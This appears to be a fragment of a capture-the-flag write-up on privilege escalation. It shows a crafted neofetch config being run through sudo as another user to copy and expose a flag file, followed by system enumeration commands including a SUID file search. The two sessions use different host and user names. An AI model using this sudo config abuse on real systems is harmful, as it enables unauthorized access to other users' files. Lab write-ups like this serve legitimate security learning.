### Privilege escalation

---

```c
ce4d1fce2d25:/tmp$ echo 'cp /home/bud/flag.txt /tmp/flag.txt && chmod 644 /tmp/flag.txt' > /home/bud/myevil.conf
ce4d1fce2d25:/tmp$ sudo -u blossom /usr/bin/neofetch --config /home/bud/myevil.conf

gideon@challenge:~$ whoami
gideon
gideon@challenge:~$ uname -a
Linux ddc4b150e3d1 6.11.0-1012-azure #12~24.04.1-Ubuntu SMP Mon Mar 10 19:00:39 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
gideon@challenge:~$ id
uid=1000(gideon) gid=1000(gideon) groups=1000(gideon),27(sudo)
gideon@challenge:~$ hostname
ddc4b150e3d1
gideon@challenge:~$ find / -perm -4000 -type f 2>/dev/null
```
